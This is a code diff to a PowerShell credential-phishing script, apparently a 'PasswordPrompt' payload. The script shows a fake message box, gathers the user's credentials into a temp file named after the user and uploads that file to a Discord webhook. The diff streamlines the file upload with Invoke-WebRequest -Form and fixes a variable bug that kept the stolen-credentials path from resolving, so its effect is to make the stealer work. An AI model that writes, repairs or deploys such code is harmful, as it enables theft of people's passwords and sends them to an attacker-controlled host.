@@ -30,22 +30,11 @@ function Send-DiscordWebhook {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
     }
     if(-not ([string]::IsNullOrEmpty($File))) {
-        $FilePath = $File
-        $FieldName = 'document'
-        $ContentType = 'text/plain'
-
-        $FileStream = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::Open)
-        $FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data')
-        $FileHeader.Name = $FieldName
-        $FileHeader.FileName = Split-Path -leaf $FilePath
-        $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
-        $FileContent.Headers.ContentDisposition = $FileHeader
-        $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse($ContentType)
-
-        $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
-        $MultipartContent.Add($FileContent)
-
-        Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri $WebhookUrl
+        $Form = @{
+            username  = $env:USER
+            file     = Get-Item -Path $File
+        }
+        Invoke-WebRequest -Uri $WebhookUrl -Method Post -Form $Form
     }
 }
 
@@ -152,7 +141,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
 Write-Host "The user clicked!: $Result"
 
 $FileNameCreds = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$FilePathCreds = $env:TEMP + "\" + $FileNameChrome
+$FilePathCreds = $env:TEMP + "\" + $FileNameCreds
 $creds = Get-Creds
 echo $creds >> $FilePathCreds
 Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -File $FilePathCreds
